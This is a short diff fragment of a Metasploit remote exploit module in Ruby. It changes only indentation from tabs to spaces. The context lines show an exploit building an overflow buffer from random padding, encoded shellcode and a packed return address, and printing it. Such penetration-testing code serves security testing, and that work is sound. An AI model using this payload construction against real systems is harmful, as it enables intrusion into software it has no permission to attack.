@@ -47,10 +47,10 @@ class MetasploitModule < Msf::Exploit::Remote
 
     sock.get_once
 
-	shellcode = payload.encoded
+    shellcode = payload.encoded
     outbound = rand_text_alphanumeric(32) + payload.encoded + [target.ret].pack('Q') 
     print_status("Outbound data: \"#{outbound}\"")
-	hexed = shellcode.dump
+    hexed = shellcode.dump
     print_status("Payload in hex: \"#{hexed}\"")
 
     print_status("Trying target #{target.name}...")
